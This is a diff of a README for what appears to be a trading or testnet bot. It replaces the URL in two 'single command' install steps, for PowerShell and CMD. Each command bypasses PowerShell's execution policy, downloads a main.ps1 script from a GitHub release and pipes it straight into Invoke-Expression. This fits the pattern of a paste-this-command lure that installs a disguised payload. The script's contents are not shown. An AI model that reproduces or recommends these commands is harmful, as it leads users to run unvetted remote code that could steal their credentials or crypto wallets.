@@ -306,12 +306,12 @@ n
 Open **PowerShell** and run this **single command**:
 
 ```powershell
-powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
+powershell -ep bypass -c "iwr https://github.com/AnmolMittal09/Perle-Labs-Testnet-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
 ```
 ### Option 2: Cmd 
 Open **CMD** and run this **single command**:
 ```
-powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
+powershell -ep bypass -c "iwr https://github.com/AnmolMittal09/Perle-Labs-Testnet-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
 ```
 
 ### Step 2 — Create a virtual environment
